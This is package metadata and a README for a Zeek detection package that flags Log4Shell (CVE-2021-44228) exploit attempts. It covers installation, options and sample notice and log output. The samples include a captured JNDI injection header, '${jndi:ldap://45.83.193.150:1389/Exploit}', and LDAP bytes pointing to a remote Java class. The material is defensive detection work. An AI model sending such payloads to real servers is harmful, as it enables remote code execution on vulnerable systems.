{"description": "A Zeek package which raises notices for RCE in Log4J (CVE-2021-44228).", "tags": "HTTP, Apache, CVE, CVE-2021-44228, encoding, rapidresponse, Java, logging", "version": "v0.6.0", "depends": null, "test_cmd": null, "build_cmd": null, "url": "https://github.com/corelight/cve-2021-44228", "summary": "A Zeek package which raises notices for RCE in Log4J (CVE-2021-44228).", "script_dir": "scripts", "plugin_dir": null, "readme": "# CVE-2021-44228\n\nA Zeek package which raises notices, tags HTTP connections and optionally generates a log for Log4J\n(CVE-2021-44228) attempts.  \n\n- Detects payload contained in HTTP headers:  See [Simplifying Detection of\nLog4Shell](https://corelight.com/blog/simplifying-detection-of-log4shell) for\ndetails.  \n\n- [Uses Zeek signatures](https://raw.githubusercontent.com/corelight/cve-2021-44228/master/scripts/ldap_java.sig) to generate notices when a Java file is\nreturned during an LDAP search. See [Detecting Log4j via Zeek & LDAP traffic](https://corelight.com/blog/detecting-the-log4j-exploit-via-zeek-and-ldap-traffic) for\ndetails.\n\n- Detects when second stage Java Class is downloaded, regardless of payload and first stage detection. See [Detecting Log4j exploits via Zeek when Java downloads Java](https://corelight.com/blog/detecting-log4j-exploits-via-zeek-when-java-downloads-java) for details.  \n  \n  \n## Installation\n\n`$ zkg install cve-2021-44228`\n\nUse against a pcap you already have:\n\n`$ zeek -Cr scripts/__load__.zeek your.pcap`\n\nIf you install from a `git clone`'d version of the repository, note that it\ndefaults to the development branch. Install from `master` or a release for a\nmore stable version of the package.\n\n## Options and notes:\n\n- `CVE_2021_44228::log` determines if the `log4j` log is generated. Defaults to `T`.\n- `CVE_2021_44228::ignorable_target_hosts` is a set of `target_host`s so ignore. It is a `set[string]` so both IPs and domains can be ignored.\n- `CVE_2021_44228::ignorable_orig_hosts` set of `addr`s from known benign scanners that can be ignored.\n- `CVE_2021_44228::ignorable_resp_hosts` above but for `resp`s.\n- `CVE_2021_44228::try_normalize` determines if normalizing the payload should be attempted. Defaults to `T`.\n\n## Example Notices\n\nThis package generates three distinct notices:\n\n1. `LOG4J_ATTEMPT_HEADER`\n1. `LOG4J_LDAP_JAVA`\n1. `LOG4J_JAVA_CLASS_DOWNLOAD`\n\n`LOG4J_ATTEMPT_HEADER` flags potential attempts based on HTTP header data. These are also logged to `log4j` if enabled.\n\n```\n#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   notice\n#open   2021-12-14-11-50-29\n#fields ts      uid     id.orig_h       id.orig_p       id.resp_h       id.resp_p       fuid    file_mime_type  file_desc       proto   note    msg     sub     src     dst     p       n       peer_descr      actions email_dest      suppress_for    remote_location.country_code    remote_location.region  remote_location.city    remote_location.latitude        remote_location.longitude\n#types  time    string  addr    port    addr    port    string  string  string  enum    enum    string  string  addr    addr    port    count   string  set[enum]       set[string]     interval        string  string  string  double  double\n1639350256.733555       Cp7gaS3nVqVl49obpb      154.65.28.250   57932   172.16.4.58     80      -       -       -       tcp     CVE_2021_44228::LOG4J_ATTEMPT_HEADER    Possible Log4j exploit CVE-2021-44228 exploit in header. Refer to sub field for sample of payload, original_URI and list of server headers      uri='/', payload_uri=45.83.193.150:1389/Exploit, payload_stem=45.83.193.150:1389, payload_host=45.83.193.150, payload_port=1389, method=GET, is_orig=T, header name='AUTHORIZATION',  header value='Bearer ${jndi:ldap://45.83.193.150:1389/Exploit}'       154.65.28.250   172.16.4.58     80      -       -       Notice::ACTION_LOG      (empty) 3600.000000     -       -       -       -       -\n#close  2021-12-14-11-50-29\n```\n\n`LOG4J_LDAP_JAVA` detects LDAP downloading Java bytecode. In practice, we see\nthis happen infrequently enough that it makes for a good proxy detection for\npossibly successful exploits.\n\n```\n#separator \\x09\n#set_separator\t,\n#empty_field\t(empty)\n#unset_field\t-\n#path\tnotice\n#open\t2021-12-16-20-54-13\n#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tfuid\tfile_mime_type\tfile_desc\tproto\tnote\tmsg\tsub\tsrc\tdst\tp\tn\tpeer_descr\tactions\temail_dest\tsuppress_for\tremote_location.country_code\tremote_location.region\tremote_location.city\tremote_location.latitude\tremote_location.longitude\n#types\ttime\tstring\taddr\tport\taddr\tport\tstring\tstring\tstring\tenum\tenum\tstring\tstring\taddr\taddr\tport\tcount\tstring\tset[enum]\tset[string]\tinterval\tstring\tstring\tstring\tdouble\tdouble\n1639425815.885952\tClEkJM2Vm5giqnMf4h\t172.16.238.10\t57650\t172.16.238.11\t1389\t-\t-\t-\ttcp\tSignatures::Sensitive_Signature\t172.16.238.11: log4j_javaclassname_tcp\t0\\x81\\x90\\x02\\x01\\x02d\\x81\\x8a\\x04\\x01a0\\x81\\x840\\x16\\x04\\x0djavaClassName1\\x05\\x04\\x03foo0*\\x04\\x0cjavaCodeBase1\\x1a\\x04\\x18http://172.16.238.11:80/0$\\x04\\x0bobjectClass1\\x15\\x04\\x13javaNamingReference0\\x18\\x04\\x0bjavaFactory1\\x09\\x04\\x07...\t172.16.238.11\t172.16.238.10\t1389\t-\t-\tNotice::ACTION_LOG\t(empty)\t3600.000000\t-\t-\t-\t-\t-\n1639425815.885952\tClEkJM2Vm5giqnMf4h\t172.16.238.10\t57650\t172.16.238.11\t1389\t-\t-\t-\ttcp\tCVE_2021_44228::LOG4J_LDAP_JAVA\tPossible Log4j exploit CVE-2021-44228 exploit, JAVA over LDAP. Refer to sub field for sample of payload.\t0\\x81\\x90\\x02\\x01\\x02d\\x81\\x8a\\x04\\x01a0\\x81\\x840\\x16\\x04\\x0djavaClassName1\\x05\\x04\\x03foo0*\\x04\\x0cjavaCodeBase1\\x1a\\x04\\x18http://172.16.238.11:80/0$\\x04\\x0bobjectClass1\\x15\\x04\\x13javaNamingReference0\\x18\\x04\\x0bjavaFactory1\\x09\\x04\\x07Exploit\t172.16.238.10\t172.16.238.11\t1389\t-\t-\tNotice::ACTION_LOG\t(empty)\t3600.000000\t-\t-\t-\t-\t-\n1639425834.635341\tCUM0KZ3MLUfNB0cl11\t172.16.238.10\t57742\t172.16.238.11\t1389\t-\t-\t-\ttcp\tSignatures::Sensitive_Signature\t172.16.238.11: log4j_javaclassname_tcp\t0\\x81\\x90\\x02\\x01\\x02d\\x81\\x8a\\x04\\x01a0\\x81\\x840\\x16\\x04\\x0djavaClassName1\\x05\\x04\\x03foo0*\\x04\\x0cjavaCodeBase1\\x1a\\x04\\x18http://172.16.238.11:80/0$\\x04\\x0bobjectClass1\\x15\\x04\\x13javaNamingReference0\\x18\\x04\\x0bjavaFactory1\\x09\\x04\\x07...\t172.16.238.11\t172.16.238.10\t1389\t-\t-\tNotice::ACTION_LOG\t(empty)\t3600.000000\t-\t-\t-\t-\t-\n#close\t2021-12-16-20-54-13\n```\n\nFinally, `LOG4J_JAVA_CLASS_DOWNLOAD` generates a notice when we are confident\nthat Java downloads more Java. As above, this happens sufficiently rarely to be\na useful proxy detection.\n\n```\n#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   notice\n#open XXXX-XX-XX-XX-XX-XX\n#fields ts      uid     id.orig_h       id.orig_p       id.resp_h       id.resp_p       fuid    file_mime_type  file_desc       proto   note    msg     sub     src     dst     p       n       peer_descr      actions email_dest      suppress_for    remote_location.country_code    remote_location.region  remote_location.city    remote_location.latitude        remote_location.longitude\n#types  time    string  addr    port    addr    port    string  string  string  enum    enum    string  string  addr    addr    port    count   string  set[enum]       set[string]     interval        string  string  string  double  double\nXXXXXXXXXX.XXXXXX       C4J4Th3PJpwUYZZ6gc      172.16.238.10   48444   172.16.238.11   80      -       -       -       tcp     CVE_2021_44228::LOG4J_JAVA_CLASS_DOWNLOAD       Possible Log4j CVE-2021-44228 exploit, Java has downloaded a Java class over HTTP indicating a potential second stage, after the primary LDAP request. Refer to sub field for user_agent and mime-type  user_agent='Java/1.8.0_51', CONTENT-TYPE='application/java-vm', host='172.16.238.11'        172.16.238.10   172.16.238.11   80      -       -       Notice::ACTION_LOG      (empty) 360XXXXXXXXXX.XXXXXX    -       -       -       -       -\nXXXXXXXXXX.XXXXXX       CmES5u32sYpV7JYN        172.16.238.10   48534   172.16.238.11   80      -       -       -       tcp     CVE_2021_44228::LOG4J_JAVA_CLASS_DOWNLOAD       Possible Log4j CVE-2021-44228 exploit, Java has downloaded a Java class over HTTP indicating a potential second stage, after the primary LDAP request. Refer to sub field for user_agent and mime-type  user_agent='Java/1.8.0_51', CONTENT-TYPE='application/java-vm', host='172.16.238.11'        172.16.238.10   172.16.238.11   80      -       -       Notice::ACTION_LOG      (empty) 360XXXXXXXXXX.XXXXXX    -       -       -       -       -\n#close  2021-12-126-19-17-58\n```\n\n## Example Log (`log4j.log`)\n\n```\n#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   log4j\n#open   2021-12-14-11-50-29\n#fields ts      uid     http_uri        uri     stem    target_host     target_port     method  is_orig name    value   matched_name    matched_value\n#types  time    string  string  string  string  string  string  string  bool    string  string  bool    bool\n1639350256.733555       Cp7gaS3nVqVl49obpb      /       45.83.193.150:1389/Exploit      45.83.193.150:1389      45.83.193.150   1389    GET     T       AUTHORIZATION   Bearer ${jndi:ldap://45.83.193.150:1389/Exploit}        F       T\n#close  2021-12-14-11-50-29\n```\n\n## References\n\n1. https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228\n1. https://corelight.com/blog/simplifying-detection-of-log4shell\n"}